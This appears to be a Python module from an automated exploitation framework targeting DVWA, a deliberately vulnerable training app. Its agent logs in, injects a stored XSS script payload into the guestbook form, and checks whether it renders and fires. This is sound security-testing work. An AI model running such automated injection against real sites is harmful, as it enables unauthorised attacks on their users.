"""Tier 1 stored XSS agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


class XSSStoredAgent(BaseAgent):
    module_name = "xss_s"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    @staticmethod
    def _csrf_visible(state: ExploitationState) -> bool:
        for endpoint in state.get("endpoints", []):
            if endpoint.get("module_name") == "csrf":
                return True
            if "csrf" in str(endpoint.get("url", "")).lower():
                return True
        return False

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/xss_s/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        payload = payload_set.probe[0] if payload_set.probe else "<script>alert(1)</script>"
        if payload in already_tried:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            tried_now.append(payload)

            submit_response = session.post(
                endpoint,
                data={
                    "txtName": "stage5",
                    "mtxMessage": payload,
                    "message": payload,
                    "btnSign": "Sign Guestbook",
                },
            )
            body_submit = submit_response.text or ""
            if "success" in body_submit.lower() or "guestbook" in body_submit.lower():
                score = max(score, 1)

            render_response = session.get(endpoint)
            body_render = render_response.text or ""
            if payload in body_render or "alert(1)" in body_render.lower():
                score = max(score, 2)

            verify_result = self.verifier.verify_xss_dialog(
                endpoint if endpoint.startswith("http") else f"{target_url.rstrip('/')}/{endpoint.lstrip('/')}",
                {k: v for k, v in session.http.cookies.items()},
            )
            if verify_result.ok:
                score = max(score, 3)
                confirmed = ["xss_stored_confirmed"]

            if score >= 3 and self._csrf_visible(state):
                score = 4
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "xss_stored_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
        )


_AGENT = XSSStoredAgent()


def xss_stored_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
